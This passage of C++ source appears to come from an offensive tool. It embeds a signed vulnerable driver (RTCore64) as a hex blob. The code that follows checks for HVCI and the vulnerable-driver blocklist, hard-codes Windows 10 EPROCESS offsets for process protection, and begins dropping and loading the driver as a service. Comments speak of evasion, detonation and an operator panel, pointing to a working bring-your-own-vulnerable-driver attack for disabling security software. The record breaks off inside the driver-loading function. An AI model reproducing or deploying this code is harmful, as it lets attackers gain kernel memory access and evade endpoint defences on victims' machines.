  0xb4, 0xb9, 0xed, 0xcf, 0x21, 0xf2, 0x5d, 0xde, 0xdf, 0xf3, 0x29, 0xc5, 0xd3, 0x8d, 0x9e, 0x14,
  0xc4, 0x28, 0x5c, 0x88, 0xe5, 0x90, 0xa3, 0x00, 0x44, 0x29, 0x12, 0xb2, 0x3e, 0x75, 0x95, 0x40,
  0x24, 0x4a, 0x6b, 0xee, 0xe2, 0xd0, 0xef, 0x86, 0x2d, 0xdf, 0x6d, 0x74, 0x1a, 0x4f, 0x1c, 0xc7,
  0x94, 0x24, 0xc4, 0x43, 0x46, 0x4f, 0x7b, 0x81, 0x01, 0x5d, 0x23, 0x73, 0x3c, 0xd9, 0x75, 0x2e,
  0x99, 0x53, 0x61, 0x56, 0x5e, 0x7c, 0xcd, 0x13, 0xe2, 0x37, 0xd2, 0x22, 0xe5, 0x70, 0xf8, 0xa7,
  0x43, 0xf6, 0x15, 0x41, 0x47, 0xfd, 0xa2, 0x47, 0x02, 0xc4, 0x36, 0x51, 0xca, 0x54, 0x5d, 0xa6,
  0xcd, 0xca, 0xd6, 0x18, 0x17, 0x53, 0x3f, 0xf1, 0xd3, 0x8e, 0x0f, 0x0a, 0xaf, 0xda, 0x17, 0x94,
  0x16, 0x57, 0xa0, 0x99, 0x14, 0x31, 0xc9, 0x0e, 0x16, 0x11, 0xd2, 0xc0, 0x4c, 0xa2, 0xa2, 0x59,
  0x78, 0xfb, 0xb6, 0xb9, 0x33, 0xcf, 0xf7, 0x63, 0xc9, 0xd2, 0xc4, 0xc8, 0x49, 0x53, 0xdd, 0x8a,
  0x59, 0x52, 0x5e, 0x7d, 0x3b, 0x38, 0x5e, 0xed, 0x22, 0x03, 0x60, 0xac, 0x85, 0xcd, 0x58, 0x32,
  0x5d, 0xcd, 0xc3, 0x1c, 0x07, 0xfa, 0x7e, 0xf6, 0x7e, 0xfb, 0xc8, 0xac, 0x37, 0x8b, 0xe4, 0x98,
  0x30, 0x82, 0x05, 0x7f, 0x30, 0x82, 0x03, 0x67, 0xa0, 0x03, 0x02, 0x01, 0x02, 0x02, 0x0a, 0x61,
  0x0b, 0x7f, 0x6b, 0x00, 0x00, 0x00, 0x00, 0x00, 0x19, 0x30, 0x0d, 0x06, 0x09, 0x2a, 0x86, 0x48,
  0x86, 0xf7, 0x0d, 0x01, 0x01, 0x05, 0x05, 0x00, 0x30, 0x7f, 0x31, 0x0b, 0x30, 0x09, 0x06, 0x03,
  0x55, 0x04, 0x06, 0x13, 0x02, 0x55, 0x53, 0x31, 0x13, 0x30, 0x11, 0x06, 0x03, 0x55, 0x04, 0x08,
  0x13, 0x0a, 0x57, 0x61, 0x73, 0x68, 0x69, 0x6e, 0x67, 0x74, 0x6f, 0x6e, 0x31, 0x10, 0x30, 0x0e,
  0x06, 0x03, 0x55, 0x04, 0x07, 0x13, 0x07, 0x52, 0x65, 0x64, 0x6d, 0x6f, 0x6e, 0x64, 0x31, 0x1e,
  0x30, 0x1c, 0x06, 0x03, 0x55, 0x04, 0x0a, 0x13, 0x15, 0x4d, 0x69, 0x63, 0x72, 0x6f, 0x73, 0x6f,
  0x66, 0x74, 0x20, 0x43, 0x6f, 0x72, 0x70, 0x6f, 0x72, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x31, 0x29,
  0x30, 0x27, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x20, 0x4d, 0x69, 0x63, 0x72, 0x6f, 0x73, 0x6f,
  0x66, 0x74, 0x20, 0x43, 0x6f, 0x64, 0x65, 0x20, 0x56, 0x65, 0x72, 0x69, 0x66, 0x69, 0x63, 0x61,
  0x74, 0x69, 0x6f, 0x6e, 0x20, 0x52, 0x6f, 0x6f, 0x74, 0x30, 0x1e, 0x17, 0x0d, 0x30, 0x36, 0x30,
  0x35, 0x32, 0x33, 0x31, 0x37, 0x30, 0x30, 0x35, 0x31, 0x5a, 0x17, 0x0d, 0x31, 0x36, 0x30, 0x35,
  0x32, 0x33, 0x31, 0x37, 0x31, 0x30, 0x35, 0x31, 0x5a, 0x30, 0x57, 0x31, 0x0b, 0x30, 0x09, 0x06,
  0x03, 0x55, 0x04, 0x06, 0x13, 0x02, 0x42, 0x45, 0x31, 0x19, 0x30, 0x17, 0x06, 0x03, 0x55, 0x04,
  0x0a, 0x13, 0x10, 0x47, 0x6c, 0x6f, 0x62, 0x61, 0x6c, 0x53, 0x69, 0x67, 0x6e, 0x20, 0x6e, 0x76,
  0x2d, 0x73, 0x61, 0x31, 0x10, 0x30, 0x0e, 0x06, 0x03, 0x55, 0x04, 0x0b, 0x13, 0x07, 0x52, 0x6f,
  0x6f, 0x74, 0x20, 0x43, 0x41, 0x31, 0x1b, 0x30, 0x19, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x12,
  0x47, 0x6c, 0x6f, 0x62, 0x61, 0x6c, 0x53, 0x69, 0x67, 0x6e, 0x20, 0x52, 0x6f, 0x6f, 0x74, 0x20,
  0x43, 0x41, 0x30, 0x82, 0x01, 0x22, 0x30, 0x0d, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d,
  0x01, 0x01, 0x01, 0x05, 0x00, 0x03, 0x82, 0x01, 0x0f, 0x00, 0x30, 0x82, 0x01, 0x0a, 0x02, 0x82,
  0x01, 0x01, 0x00, 0xda, 0x0e, 0xe6, 0x99, 0x8d, 0xce, 0xa3, 0xe3, 0x4f, 0x8a, 0x7e, 0xfb, 0xf1,
  0x8b, 0x83, 0x25, 0x6b, 0xea, 0x48, 0x1f, 0xf1, 0x2a, 0xb0, 0xb9, 0x95, 0x11, 0x04, 0xbd, 0xf0,
  0x63, 0xd1, 0xe2, 0x67, 0x66, 0xcf, 0x1c, 0xdd, 0xcf, 0x1b, 0x48, 0x2b, 0xee, 0x8d, 0x89, 0x8e,
  0x9a, 0xaf, 0x29, 0x80, 0x65, 0xab, 0xe9, 0xc7, 0x2d, 0x12, 0xcb, 0xab, 0x1c, 0x4c, 0x70, 0x07,
  0xa1, 0x3d, 0x0a, 0x30, 0xcd, 0x15, 0x8d, 0x4f, 0xf8, 0xdd, 0xd4, 0x8c, 0x50, 0x15, 0x1c, 0xef,
  0x50, 0xee, 0xc4, 0x2e, 0xf7, 0xfc, 0xe9, 0x52, 0xf2, 0x91, 0x7d, 0xe0, 0x6d, 0xd5, 0x35, 0x30,
  0x8e, 0x5e, 0x43, 0x73, 0xf2, 0x41, 0xe9, 0xd5, 0x6a, 0xe3, 0xb2, 0x89, 0x3a, 0x56, 0x39, 0x38,
  0x6f, 0x06, 0x3c, 0x88, 0x69, 0x5b, 0x2a, 0x4d, 0xc5, 0xa7, 0x54, 0xb8, 0x6c, 0x89, 0xcc, 0x9b,
  0xf9, 0x3c, 0xca, 0xe5, 0xfd, 0x89, 0xf5, 0x12, 0x3c, 0x92, 0x78, 0x96, 0xd6, 0xdc, 0x74, 0x6e,
  0x93, 0x44, 0x61, 0xd1, 0x8d, 0xc7, 0x46, 0xb2, 0x75, 0x0e, 0x86, 0xe8, 0x19, 0x8a, 0xd5, 0x6d,
  0x6c, 0xd5, 0x78, 0x16, 0x95, 0xa2, 0xe9, 0xc8, 0x0a, 0x38, 0xeb, 0xf2, 0x24, 0x13, 0x4f, 0x73,
  0x54, 0x93, 0x13, 0x85, 0x3a, 0x1b, 0xbc, 0x1e, 0x34, 0xb5, 0x8b, 0x05, 0x8c, 0xb9, 0x77, 0x8b,
  0xb1, 0xdb, 0x1f, 0x20, 0x91, 0xab, 0x09, 0x53, 0x6e, 0x90, 0xce, 0x7b, 0x37, 0x74, 0xb9, 0x70,
  0x47, 0x91, 0x22, 0x51, 0x63, 0x16, 0x79, 0xae, 0xb1, 0xae, 0x41, 0x26, 0x08, 0xc8, 0x19, 0x2b,
  0xd1, 0x46, 0xaa, 0x48, 0xd6, 0x64, 0x2a, 0xd7, 0x83, 0x34, 0xff, 0x2c, 0x2a, 0xc1, 0x6c, 0x19,
  0x43, 0x4a, 0x07, 0x85, 0xe7, 0xd3, 0x7c, 0xf6, 0x21, 0x68, 0xef, 0xea, 0xf2, 0x52, 0x9f, 0x7f,
  0x93, 0x90, 0xcf, 0x02, 0x03, 0x01, 0x00, 0x01, 0xa3, 0x82, 0x01, 0x23, 0x30, 0x82, 0x01, 0x1f,
  0x30, 0x11, 0x06, 0x03, 0x55, 0x1d, 0x20, 0x04, 0x0a, 0x30, 0x08, 0x30, 0x06, 0x06, 0x04, 0x55,
  0x1d, 0x20, 0x00, 0x30, 0x36, 0x06, 0x09, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x15, 0x07,
  0x04, 0x29, 0x30, 0x27, 0x06, 0x1f, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x15, 0x08, 0x8d,
  0xe0, 0xd1, 0x89, 0x4e, 0x84, 0xd7, 0x9c, 0xc3, 0x07, 0x86, 0xa6, 0x86, 0xfb, 0x1c, 0x8f, 0xd3,
  0xbf, 0xa6, 0x15, 0x01, 0x19, 0x02, 0x01, 0x6e, 0x02, 0x01, 0x00, 0x30, 0x0b, 0x06, 0x03, 0x55,
  0x1d, 0x0f, 0x04, 0x04, 0x03, 0x02, 0x01, 0x86, 0x30, 0x0f, 0x06, 0x03, 0x55, 0x1d, 0x13, 0x01,
  0x01, 0xff, 0x04, 0x05, 0x30, 0x03, 0x01, 0x01, 0xff, 0x30, 0x1d, 0x06, 0x03, 0x55, 0x1d, 0x0e,
  0x04, 0x16, 0x04, 0x14, 0x60, 0x7b, 0x66, 0x1a, 0x45, 0x0d, 0x97, 0xca, 0x89, 0x50, 0x2f, 0x7d,
  0x04, 0xcd, 0x34, 0xa8, 0xff, 0xfc, 0xfd, 0x4b, 0x30, 0x1d, 0x06, 0x09, 0x2b, 0x06, 0x01, 0x04,
  0x01, 0x82, 0x37, 0x14, 0x02, 0x04, 0x10, 0x1e, 0x0e, 0x00, 0x43, 0x00, 0x72, 0x00, 0x6f, 0x00,
  0x73, 0x00, 0x73, 0x00, 0x43, 0x00, 0x41, 0x30, 0x1f, 0x06, 0x03, 0x55, 0x1d, 0x23, 0x04, 0x18,
  0x30, 0x16, 0x80, 0x14, 0x62, 0xfb, 0x0a, 0x21, 0x5b, 0x7f, 0x43, 0x6e, 0x11, 0xda, 0x09, 0x54,
  0x50, 0x6b, 0xf5, 0xd2, 0x96, 0x71, 0xf1, 0x9e, 0x30, 0x55, 0x06, 0x03, 0x55, 0x1d, 0x1f, 0x04,
  0x4e, 0x30, 0x4c, 0x30, 0x4a, 0xa0, 0x48, 0xa0, 0x46, 0x86, 0x44, 0x68, 0x74, 0x74, 0x70, 0x3a,
  0x2f, 0x2f, 0x63, 0x72, 0x6c, 0x2e, 0x6d, 0x69, 0x63, 0x72, 0x6f, 0x73, 0x6f, 0x66, 0x74, 0x2e,
  0x63, 0x6f, 0x6d, 0x2f, 0x70, 0x6b, 0x69, 0x2f, 0x63, 0x72, 0x6c, 0x2f, 0x70, 0x72, 0x6f, 0x64,
  0x75, 0x63, 0x74, 0x73, 0x2f, 0x4d, 0x69, 0x63, 0x72, 0x6f, 0x73, 0x6f, 0x66, 0x74, 0x43, 0x6f,
  0x64, 0x65, 0x56, 0x65, 0x72, 0x69, 0x66, 0x52, 0x6f, 0x6f, 0x74, 0x2e, 0x63, 0x72, 0x6c, 0x30,
  0x0d, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x05, 0x05, 0x00, 0x03, 0x82,
  0x02, 0x01, 0x00, 0x13, 0xc5, 0x6c, 0x5e, 0x07, 0x7f, 0x3c, 0x57, 0xff, 0x9b, 0x31, 0x5f, 0x3f,
  0xbd, 0x95, 0x54, 0x25, 0xc6, 0x79, 0xf9, 0x2c, 0x31, 0x03, 0x4d, 0x64, 0x69, 0x4b, 0x56, 0xd9,
  0x5b, 0x97, 0x6f, 0x7c, 0xf3, 0xf0, 0xd0, 0x24, 0x65, 0x75, 0x38, 0x63, 0x98, 0x13, 0x70, 0x16,
  0x13, 0xf7, 0xa7, 0x01, 0xf1, 0xc6, 0x23, 0xe0, 0x85, 0x86, 0x6c, 0x0b, 0xf0, 0x80, 0x94, 0x5a,
  0x75, 0xe8, 0x7c, 0xe4, 0x1e, 0x92, 0xb4, 0x73, 0xbf, 0xc1, 0xb3, 0xa7, 0xb0, 0x0b, 0xd3, 0x18,
  0x84, 0xcb, 0xcc, 0x09, 0xa3, 0x5c, 0x9c, 0x4f, 0x3e, 0xb0, 0x3a, 0x9c, 0x2d, 0x1b, 0xc4, 0x04,
  0xef, 0x97, 0x37, 0x96, 0x6f, 0xe5, 0xec, 0xba, 0xac, 0x6a, 0xb3, 0xd4, 0xe2, 0x3c, 0xdf, 0x8b,
  0x25, 0xe7, 0xac, 0xbc, 0x62, 0x45, 0x31, 0xdd, 0xa4, 0x0a, 0x72, 0xe4, 0x1b, 0xf8, 0x78, 0x43,
  0x01, 0xcc, 0xba, 0x39, 0x14, 0xde, 0x5d, 0x90, 0xae, 0xd8, 0x5a, 0xcf, 0x5e, 0xca, 0x46, 0x81,
  0x51, 0x33, 0xd5, 0xa6, 0x0e, 0x58, 0x67, 0xd3, 0xd8, 0x66, 0x58, 0x88, 0x16, 0x9b, 0xee, 0xb1,
  0x1a, 0xca, 0xad, 0x91, 0x13, 0x84, 0x21, 0xda, 0x9a, 0x6e, 0x20, 0xef, 0xda, 0x00, 0x74, 0x28,
  0xba, 0xc9, 0x5f, 0xf3, 0x4d, 0x5d, 0xc3, 0xda, 0x25, 0x69, 0x25, 0x54, 0xea, 0x44, 0xbc, 0xc3,
  0x9b, 0x29, 0x33, 0x1c, 0xd6, 0x3c, 0x96, 0x1f, 0x87, 0x81, 0xc5, 0x53, 0xd7, 0x2a, 0x27, 0x33,
  0xd4, 0x2e, 0x19, 0x7c, 0x08, 0x58, 0x6d, 0xdb, 0x4e, 0x19, 0x99, 0xa9, 0xea, 0x5f, 0xf3, 0x9a,
  0x9d, 0x8c, 0x51, 0x3a, 0x5a, 0x5c, 0xbd, 0x2f, 0xa9, 0x08, 0x35, 0x9b, 0x54, 0xa7, 0xdb, 0x35,
  0x1a, 0x52, 0x16, 0x33, 0x34, 0x3a, 0xa3, 0x80, 0x04, 0x6a, 0xfd, 0xb4, 0x83, 0x8c, 0xad, 0x90,
  0xcf, 0x0c, 0x3a, 0x65, 0x96, 0xec, 0x33, 0x4e, 0x18, 0x26, 0xb8, 0x49, 0xbb, 0xeb, 0x81, 0x92,
  0xff, 0x13, 0x4d, 0x32, 0x4b, 0x23, 0xc7, 0x33, 0xe7, 0xb6, 0x71, 0x6b, 0x15, 0xf6, 0x9c, 0x80,
  0xe6, 0xbc, 0xb7, 0x6c, 0xbe, 0x41, 0xd5, 0x03, 0x3a, 0x71, 0x33, 0x15, 0x00, 0x50, 0x74, 0x3b,
  0x0e, 0x5d, 0xf9, 0x96, 0xaa, 0xed, 0x90, 0x3e, 0xab, 0x13, 0x4c, 0x80, 0x99, 0x26, 0xbc, 0x38,
  0xa5, 0xeb, 0x02, 0x36, 0x89, 0x1d, 0xb6, 0x20, 0xbe, 0x83, 0xab, 0x10, 0xf8, 0x19, 0x9e, 0xd7,
  0x63, 0x79, 0xd4, 0xae, 0xb1, 0x2f, 0x61, 0x36, 0xf9, 0x4a, 0x4b, 0xa8, 0x33, 0xc7, 0x0e, 0x72,
  0x41, 0xf9, 0xf1, 0xb1, 0x90, 0x7e, 0xae, 0x46, 0xef, 0xde, 0x39, 0x7b, 0x75, 0xa0, 0x41, 0x14,
  0x59, 0x04, 0x1d, 0x42, 0xbc, 0x47, 0x88, 0xb8, 0x13, 0x0e, 0x05, 0xfa, 0x1d, 0xf0, 0x80, 0x8d,
  0xff, 0x70, 0xc6, 0x77, 0xd8, 0x4b, 0xdc, 0x46, 0x0e, 0x23, 0x1a, 0x72, 0xd5, 0xbf, 0xde, 0xfe,
  0xaa, 0xae, 0x69, 0x58, 0x3c, 0xfc, 0x5c, 0x46, 0xe4, 0xd5, 0x81, 0x9a, 0x8b, 0x6e, 0x65, 0x59,
  0x77, 0x1a, 0x32, 0xa5, 0x90, 0xa6, 0xb6, 0x64, 0x93, 0x64, 0xfd, 0x07, 0x53, 0xc9, 0xa0, 0xde,
  0x28, 0xad, 0x2a, 0x6c, 0xc6, 0x38, 0xd1, 0x81, 0xce, 0x98, 0xf5, 0x40, 0x19, 0xe9, 0x2c, 0x17,
  0x43, 0xa4, 0x26, 0x5f, 0xd3, 0x44, 0x30, 0x53, 0xe4, 0x1d, 0x02, 0xba, 0xa4, 0x0a, 0x2f, 0x16,
  0xdd, 0x7a, 0x60, 0x27, 0x52, 0x42, 0xbb, 0xad, 0x98, 0x37, 0x28, 0x97, 0xe4, 0xb8, 0xd2, 0x79,
  0x11, 0xe3, 0x10, 0x8c, 0x48, 0xd5, 0x30, 0x5d, 0x0a, 0x0c, 0x52, 0xde, 0xf5, 0x88, 0xea, 0x8d,
  0x1a, 0x2d, 0x67, 0xc9, 0xf4, 0x80, 0x14, 0x84, 0xb7, 0x85, 0x0c, 0xd1, 0x66, 0x28, 0xa5, 0xc6,
  0x6f, 0x24, 0x61, 0x31, 0x82, 0x03, 0x0d, 0x30, 0x82, 0x03, 0x09, 0x02, 0x01, 0x01, 0x30, 0x72,
  0x30, 0x63, 0x31, 0x0b, 0x30, 0x09, 0x06, 0x03, 0x55, 0x04, 0x06, 0x13, 0x02, 0x42, 0x45, 0x31,
  0x19, 0x30, 0x17, 0x06, 0x03, 0x55, 0x04, 0x0a, 0x13, 0x10, 0x47, 0x6c, 0x6f, 0x62, 0x61, 0x6c,
  0x53, 0x69, 0x67, 0x6e, 0x20, 0x6e, 0x76, 0x2d, 0x73, 0x61, 0x31, 0x16, 0x30, 0x14, 0x06, 0x03,
  0x55, 0x04, 0x0b, 0x13, 0x0d, 0x4f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x53, 0x69, 0x67, 0x6e, 0x20,
  0x43, 0x41, 0x31, 0x21, 0x30, 0x1f, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x18, 0x47, 0x6c, 0x6f,
  0x62, 0x61, 0x6c, 0x53, 0x69, 0x67, 0x6e, 0x20, 0x4f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x53, 0x69,
  0x67, 0x6e, 0x20, 0x43, 0x41, 0x02, 0x0b, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01, 0x1c, 0x08, 0xb7,
  0xf6, 0x7e, 0x30, 0x09, 0x06, 0x05, 0x2b, 0x0e, 0x03, 0x02, 0x1a, 0x05, 0x00, 0xa0, 0x70, 0x30,
  0x10, 0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x01, 0x0c, 0x31, 0x02, 0x30,
  0x00, 0x30, 0x19, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x09, 0x03, 0x31, 0x0c,
  0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x01, 0x04, 0x30, 0x1c, 0x06, 0x0a,
  0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x01, 0x0b, 0x31, 0x0e, 0x30, 0x0c, 0x06, 0x0a,
  0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x01, 0x15, 0x30, 0x23, 0x06, 0x09, 0x2a, 0x86,
  0x48, 0x86, 0xf7, 0x0d, 0x01, 0x09, 0x04, 0x31, 0x16, 0x04, 0x14, 0xc4, 0xa7, 0xa4, 0xd2, 0xf2,
  0x6d, 0x76, 0x77, 0x31, 0x6a, 0xf0, 0x9f, 0x21, 0x13, 0x28, 0xf3, 0xae, 0x3f, 0x18, 0x23, 0x30,
  0x0d, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x01, 0x05, 0x00, 0x04, 0x81,
  0x80, 0x7f, 0x0c, 0xf3, 0xac, 0x50, 0x96, 0x37, 0x09, 0x2a, 0x2e, 0x5f, 0xc7, 0xec, 0x95, 0xc8,
  0xca, 0x9b, 0x10, 0x91, 0x82, 0x8d, 0xb8, 0xda, 0x1b, 0xb1, 0xf0, 0x6e, 0xb4, 0x92, 0x6f, 0xff,
  0x98, 0x7d, 0x14, 0x9a, 0x17, 0x2f, 0xfa, 0x6f, 0xbf, 0xf2, 0x73, 0xfb, 0xb3, 0x49, 0xcd, 0xde,
  0xdc, 0xc1, 0x28, 0xb8, 0x06, 0xb4, 0xcb, 0x9e, 0xc7, 0xbc, 0x78, 0x81, 0x65, 0x40, 0x72, 0xd7,
  0xb0, 0xb4, 0x8e, 0x78, 0x43, 0x63, 0x15, 0x53, 0x14, 0x33, 0xc5, 0x62, 0x63, 0xe3, 0x53, 0x3f,
  0x08, 0xaa, 0x30, 0x87, 0x60, 0x88, 0xee, 0x54, 0x9b, 0x3d, 0x56, 0xf3, 0x3b, 0x76, 0x90, 0xb1,
  0x66, 0x2f, 0xee, 0x4c, 0xaa, 0x4a, 0xde, 0xf4, 0xd1, 0x7a, 0xae, 0xbe, 0xad, 0x55, 0xee, 0x28,
  0x05, 0x57, 0xca, 0x3f, 0xce, 0x5c, 0x97, 0x29, 0x17, 0x15, 0x04, 0x0f, 0x78, 0xa3, 0xf3, 0xf5,
  0xa9, 0xa1, 0x82, 0x01, 0x7f, 0x30, 0x82, 0x01, 0x7b, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7,
  0x0d, 0x01, 0x09, 0x06, 0x31, 0x82, 0x01, 0x6c, 0x30, 0x82, 0x01, 0x68, 0x02, 0x01, 0x01, 0x30,
  0x67, 0x30, 0x53, 0x31, 0x0b, 0x30, 0x09, 0x06, 0x03, 0x55, 0x04, 0x06, 0x13, 0x02, 0x55, 0x53,
  0x31, 0x17, 0x30, 0x15, 0x06, 0x03, 0x55, 0x04, 0x0a, 0x13, 0x0e, 0x56, 0x65, 0x72, 0x69, 0x53,
  0x69, 0x67, 0x6e, 0x2c, 0x20, 0x49, 0x6e, 0x63, 0x2e, 0x31, 0x2b, 0x30, 0x29, 0x06, 0x03, 0x55,
  0x04, 0x03, 0x13, 0x22, 0x56, 0x65, 0x72, 0x69, 0x53, 0x69, 0x67, 0x6e, 0x20, 0x54, 0x69, 0x6d,
  0x65, 0x20, 0x53, 0x74, 0x61, 0x6d, 0x70, 0x69, 0x6e, 0x67, 0x20, 0x53, 0x65, 0x72, 0x76, 0x69,
  0x63, 0x65, 0x73, 0x20, 0x43, 0x41, 0x02, 0x10, 0x38, 0x25, 0xd7, 0xfa, 0xf8, 0x61, 0xaf, 0x9e,
  0xf4, 0x90, 0xe7, 0x26, 0xb5, 0xd6, 0x5a, 0xd5, 0x30, 0x09, 0x06, 0x05, 0x2b, 0x0e, 0x03, 0x02,
  0x1a, 0x05, 0x00, 0xa0, 0x5d, 0x30, 0x18, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01,
  0x09, 0x03, 0x31, 0x0b, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x07, 0x01, 0x30,
  0x1c, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x09, 0x05, 0x31, 0x0f, 0x17, 0x0d,
  0x31, 0x30, 0x30, 0x38, 0x33, 0x31, 0x30, 0x33, 0x30, 0x34, 0x32, 0x32, 0x5a, 0x30, 0x23, 0x06,
  0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x09, 0x04, 0x31, 0x16, 0x04, 0x14, 0x9c, 0x72,
  0xe6, 0x77, 0x3c, 0xa8, 0xf5, 0x68, 0x72, 0xe1, 0xe0, 0x70, 0x83, 0xc0, 0xd4, 0x15, 0x1f, 0x30,
  0xeb, 0x43, 0x30, 0x0d, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x01, 0x05,
  0x00, 0x04, 0x81, 0x80, 0x5d, 0xd9, 0xf1, 0x70, 0xf1, 0x0c, 0x66, 0x7b, 0x70, 0x86, 0xdc, 0x11,
  0xeb, 0xe8, 0x54, 0xed, 0x7e, 0x6c, 0xd5, 0x35, 0x8b, 0xde, 0xba, 0x2c, 0xf2, 0x43, 0x75, 0x57,
  0xdb, 0xfd, 0x50, 0x23, 0x00, 0xd2, 0x16, 0xdf, 0xbc, 0x63, 0x28, 0xbb, 0xab, 0x8b, 0xc1, 0x7c,
  0x24, 0x8d, 0x3c, 0x11, 0x57, 0xc5, 0xba, 0x67, 0x5a, 0x5c, 0x0b, 0xd2, 0x37, 0xcf, 0x20, 0x8e,
  0x19, 0x37, 0x49, 0x4d, 0x76, 0x0f, 0x12, 0x95, 0x17, 0x89, 0x39, 0xd8, 0x53, 0x57, 0x35, 0xcd,
  0x64, 0x37, 0xb7, 0x45, 0x86, 0x76, 0x4f, 0xc1, 0x5f, 0x29, 0x3e, 0x16, 0xca, 0xa0, 0xe1, 0xf6,
  0x8a, 0xca, 0xfe, 0x5f, 0xfe, 0x89, 0xbb, 0xde, 0x6b, 0x67, 0x1a, 0x9f, 0xcf, 0x99, 0xfe, 0x73,
  0xa3, 0x7d, 0x9a, 0xd2, 0x07, 0x9f, 0xa8, 0xb6, 0xa8, 0x9a, 0x67, 0xcb, 0xfe, 0xd0, 0x8a, 0xcb,
  0xe2, 0x0e, 0xce, 0xf8, 0x00, 0x00, 0x00, 0x00
        };
        unsigned int kRTCore64_len = 14648;

        static_assert(sizeof(kRTCore64) == 14648, "driver blob truncated — recheck paste");

        constexpr uint64_t kUniqueProcessIdOffset = 0x440;
        constexpr uint64_t kActiveProcessLinksOffset = 0x448;
        constexpr uint64_t kProtectionOffset = 0x87A;

        // These offsets are only valid for the Windows 10 2004..22H2 EPROCESS
        // layout (builds 19041..19045). On any other build the 2-byte write at
        // kProtectionOffset lands in an unrelated field, so the driver path
        // refuses rather than risking a kernel corruption.
        static bool SupportedEprocessLayout() {
            typedef LONG(WINAPI* RtlGetVersionPtr)(OSVERSIONINFOW*);
            HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
            if (!hNtdll) return false;
            RtlGetVersionPtr fn = (RtlGetVersionPtr)GetProcAddress(hNtdll, "RtlGetVersion");
            if (!fn) return false;
            OSVERSIONINFOW vi{};
            vi.dwOSVersionInfoSize = sizeof(vi);
            if (fn(&vi) != 0) return false;
            return vi.dwMajorVersion == 10 &&
                vi.dwBuildNumber >= 19041 && vi.dwBuildNumber <= 19045;
        }

        // Last evasion outcome, reported to the panel by the detonation path.
        static std::string g_lastReport = "evasion=notrun";
        static const std::string& LastReport() { return g_lastReport; }

        // HVCI/VBS makes the unsigned driver fail regardless of the CI
        // blocklist. Checking first keeps a .sys and a service off disk and
        // gives the operator a truthful reason instead of "blocked".
        static bool HvciEnabled() {
            HKEY h = NULL;
            bool on = false;
            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                L"SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity",
                0, KEY_READ, &h) == ERROR_SUCCESS) {
                DWORD v = 0, sz = sizeof(v), type = 0;
                if (RegQueryValueExW(h, L"Enabled", NULL, &type, (BYTE*)&v, &sz) == ERROR_SUCCESS &&
                    type == REG_DWORD && v != 0) {
                    on = true;
                }
                RegCloseKey(h);
            }
            if (!on && RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                L"SYSTEM\\CurrentControlSet\\Control\\DeviceGuard", 0,
                KEY_READ, &h) == ERROR_SUCCESS) {
                DWORD v = 0, sz = sizeof(v), type = 0;
                if (RegQueryValueExW(h, L"EnableVirtualizationBasedSecurity", NULL,
                        &type, (BYTE*)&v, &sz) == ERROR_SUCCESS &&
                    type == REG_DWORD && v != 0) on = true;
                RegCloseKey(h);
            }
            return on;
        }

        // The Microsoft vulnerable-driver blocklist (on by default on current
        // Windows). Report-only: the load attempt still happens when HVCI is off.
        static bool DriverBlocklistEnabled() {
            HKEY h = NULL;
            bool on = true;
            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                L"SYSTEM\\CurrentControlSet\\Control\\CI\\Config",
                0, KEY_READ, &h) == ERROR_SUCCESS) {
                DWORD v = 1, sz = sizeof(v), type = 0;
                if (RegQueryValueExW(h, L"VulnerableDriverBlocklistEnable", NULL, &type,
                    (BYTE*)&v, &sz) == ERROR_SUCCESS && type == REG_DWORD) {
                    on = v != 0;
                }
                RegCloseKey(h);
            }
            return on;
        }

        uint64_t g_SystemEprocess = 0;

        struct RTCoreReadReq {
            uint64_t Address;
            uint32_t Size;
            uint32_t Padding;
        };

        struct RTCoreWriteReq {
            uint64_t Address;
            uint32_t Size;
            uint32_t Padding;
            uint8_t  Data[1];
        };

        static HANDLE hRTCore = INVALID_HANDLE_VALUE;
        static SC_HANDLE g_hSCM = NULL;
        static SC_HANDLE g_hSvc = NULL;
        static std::wstring g_driverPath;

        static const char* kRTCore64Hash =
            "a56e9a2f5162eeeb";

        static bool DriverHashOk() {
            // FNV-1a over the embedded blob: integrity/corruption check only.
            uint64_t h = 1469598103934665603ull;
            for (size_t i = 0; i < kRTCore64_len; i++) {
                h ^= kRTCore64[i];
                h *= 1099511628211ull;
            }
            char got[32]{};
            sprintf_s(got, "%016llx", (unsigned long long)h);
            return _stricmp(got, kRTCore64Hash) == 0;
        }

        static bool DropAndLoadDriver() {
            if (!DriverHashOk()) {
                g_lastReport = "byovd=driver-corrupt";
                return false;
            }
